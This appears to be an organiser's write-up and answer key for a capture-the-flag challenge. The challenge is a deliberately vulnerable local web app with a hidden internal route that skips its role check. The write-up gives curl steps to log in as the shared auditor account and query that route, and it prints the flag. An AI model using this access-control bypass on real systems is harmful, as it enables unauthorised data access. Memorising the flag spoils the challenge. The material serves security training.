# Organiser Challenge Write-Up: Challenge 08 — The Internal Dashboard

## 1. Challenge Overview
- **Name:** The Internal Dashboard
- **Category:** Web Application Security / Broken Access Control / Code Auditing
- **Tier:** Progressive (15 Points)
- **Flag:** `ROOT{l3g4cy_sync_uns4f3_byp4ss_78a1}`
- **Target Service:** Unified Veyra Internal Enterprise Application (`http://localhost:3007`)
- **Downloadable Static Artifact Location:**
  - Zip Archive: `/challenges/08-internal-dashboard/artifacts/veyra-frontend-portal-release.zip`
  - Minified Bundle: `/challenges/08-internal-dashboard/artifacts/bundle.min.js`
- **Shared Participant Credentials:**
  - Username: `priya.nair`
  - Password: `Veyra#Audit26`
  - Role: `auditor`

---

## 2. Vulnerability Mechanism
The Veyra internal enterprise application provides several distinct route groups behind authentication:
- `GET /api/billing/summary`: protected by server-side role check (`billing_admin`). Returns HTTP 403 to Priya.
- `GET /api/reporting/exports`: protected by server-side role check (`analytics_admin`). Returns HTTP 403 to Priya.
- `GET /api/users/directory`: protected by server-side role check (`user_admin`). Returns HTTP 403 to Priya.

The rendered frontend UI links only these protected routes and the normal invoices/audit tabs.
However, in the production-bundled client JavaScript (`bundle.min.js`), an unlinked secondary operational route exists:
- `GET /api/ops/legacy-sync-status`

While properly validating that an authenticated session exists, this endpoint **omits the server-side role check entirely**. An authenticated auditor (Priya Nair) can query this route and retrieve operational sync diagnostics containing the flag.

---

## 3. Discoverable Source Artifact Analysis
The frontend source code was bundled and genuinely minified using `esbuild` (`target: es2020`, `minify: true`, `format: iife`).

### Locating the Vulnerable Route
1. Extract `/challenges/08-internal-dashboard/artifacts/veyra-frontend-portal-release.zip` or open `bundle.min.js`.
2. Format / de-minify the bundle using Prettier or your IDE.
3. Search for `/api/` or `fetch(`:
   - Notice the endpoint table in `APPLICATION_ROUTES` or `VeyraApiClient`:
     ```javascript
     async getLegacySyncStatus() {
       return this.request("/api/ops/legacy-sync-status");
     }
     ```
   - Notice the route definition:
     ```javascript
     { path: "/ops/legacy-sync-status", component: "LegacySyncWorkerDiagnostic", isInternal: true }
     ```
4. Verify that `/api/ops/legacy-sync-status` does NOT appear anywhere in the rendered `index.html` navigation or user interface.

---

## 4. Exploitation & Flag Retrieval

### Step 1: Authenticate as Priya Nair
```bash
curl -i -X POST "http://localhost:3007/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"priya.nair","password":"Veyra#Audit26"}'
```
Save the returned `Set-Cookie: veyra_portal_session=...`.

### Step 2: Request the Unprotected Secondary Route
```bash
curl -s -X GET "http://localhost:3007/api/ops/legacy-sync-status" \
  -H "Cookie: veyra_portal_session=<SESSION_COOKIE>"
```

### Step 3: Expected Server Response
```json
{
  "status": "degraded",
  "service": "legacy-sync-worker-v1",
  "last_sync_timestamp": "2026-11-06T23:59:00Z",
  "upstream_endpoint": "https://internal-sync.core.veyra.cloud/v1",
  "cluster_region": "us-east-1a",
  "diagnostics": {
    "pending_mutations": 0,
    "sync_lock_held": false,
    "worker_threads": 4,
    "vault_token_backup": "ROOT{l3g4cy_sync_uns4f3_byp4ss_78a1}",
    "environment": "production-internal"
  }
}
```

---

## 5. Organiser Reset Procedure
When an admin triggers a force-reset via the platform admin panel or directly via HTTP:
```bash
curl -X POST "http://localhost:3007/reset/8" \
  -H "Authorization: Bearer <RESET_TOKEN>"
```

Expected response:
```json
{
  "status": "ok",
  "challenge_id": 8,
  "message": "Challenge 08 (The Internal Dashboard) operational services reset successfully"
}
```
*Note on shared architecture:* Because Challenges 07 and 08 share the same underlying SQLite database and server process, resetting Challenge 08 ensures the internal configuration state and operational worker telemetry are synchronized with baseline seed data.
